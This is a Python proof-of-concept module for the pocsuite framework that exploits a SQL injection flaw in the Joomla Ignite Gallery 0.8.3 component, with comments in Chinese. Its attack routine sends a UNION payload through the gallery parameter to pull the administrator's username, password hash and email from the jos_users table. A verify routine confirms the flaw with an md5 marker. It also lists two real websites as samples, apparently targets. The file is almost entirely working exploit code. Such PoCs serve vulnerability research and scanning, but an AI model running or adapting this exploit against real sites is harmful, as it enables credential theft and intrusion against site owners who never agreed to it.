#!/usr/bin/env python
# coding: utf-8
from pocsuite.net import req
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register
import re

class TestPOC(POCBase):
    vulID = '65822'  # ssvid
    version = '1.0'
    author = ['kikay']
    vulDate = '2009-02-19'
    createDate = '2016-01-20'
    updateDate = '2016-01-20'
    references = ['http://www.sebug.net/vuldb/ssvid-65822']
    name = 'Joomla Component Ignite Gallery 0.8.3 - SQL Injection Vulnerability'
    appPowerLink = 'http://www.joomla.org'
    appName = 'Joomla Component Ignite Gallery'
    appVersion = '0.8.3'
    vulType = 'SQL Injection'
    desc = '''
        Ignite Gallery (com_ignitegallery)组件0.8.0版本至0.8.3版本中存在SQL注入漏洞，
        远程攻击者可以借助对index.php的一个图像操作中的gallery参数，执行任意SQL指令。
    '''
    samples = ['http://www.crnm.org','http://www.bike-and-run.com']

    def _attack(self):
        #利用SQL注入读取joomla管理员信息
        result = {}
        #访问的地址
        exploit='/index.php?option=com_ignitegallery&task=view&gallery='
        #利用Union方式读取信息
        payload="-1 union select 1,2,concat(0x247e7e7e24,username,0x2a2a2a,"\
        "password,0x2a2a2a,email,0x247e7e7e24),4,5,6,7,8,9,10 from jos_users limit 0,1--"
        #构造漏洞利用连接
        vulurl=self.url+exploit+payload
        #自定义的HTTP头
        httphead = {
          'User-Agent':'Mozilla/5.0 (Windows NT 6.2; rv:16.0) Gecko/20100101 Firefox/16.0',
          'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
          'Connection':'keep-alive'
        }
        #提取信息的正则表达式
        parttern='\$~~~\$(.*)\*\*\*(.*)\*\*\*(.*)\$~~~\$'
        #发送请求
        resp=req.get(url=vulurl,headers=httphead,timeout=50)
        #检查是否含有特征字符串
        if '$~~~$' in resp.content:
            #提取信息
            match=re.search(parttern,resp.content,re.M|re.I)
            if match:
                #漏洞利用成功
                result['AdminInfo']={}
                #用户名
                result['AdminInfo']['Username']=match.group(1)
                #密码
                result['AdminInfo']['Password']=match.group(2)
                #邮箱
                result['AdminInfo']['Email']=match.group(3)
        return self.parse_output(result)

    def _verify(self):
        #通过计算md5(3.1415)的值，来验证SQL注入
        result = {}
        #访问的地址
        exploit='/index.php?option=com_ignitegallery&task=view&gallery='
        #利用union的方式（计算md5(3.1415)）
        payload="-1 union select 1,2,md5(3.1415),4,5,6,7,8,9,10--"
        #构造漏洞利用连接
        vulurl=self.url+exploit+payload
        #自定义的HTTP头
        httphead = {
          'User-Agent':'Mozilla/5.0 (Windows NT 6.2; rv:16.0) Gecko/20100101 Firefox/16.0',
          'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
          'Connection':'keep-alive'
        }
        #发送请求
        resp=req.get(url=vulurl,headers=httphead,timeout=50)
        #检查是否含有特征字符串(md5(3.1415)=63e1f04640e83605c1d177544a5a0488)
        if '63e1f04640e83605c1d177544a5a0488' in resp.content:
            #漏洞验证成功
            result['VerifyInfo']={}
            result['VerifyInfo']['URL'] = self.url+exploit
            result['VerifyInfo']['Payload'] = payload
        return self.parse_output(result)

    def parse_output(self, result):
        #parse output
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)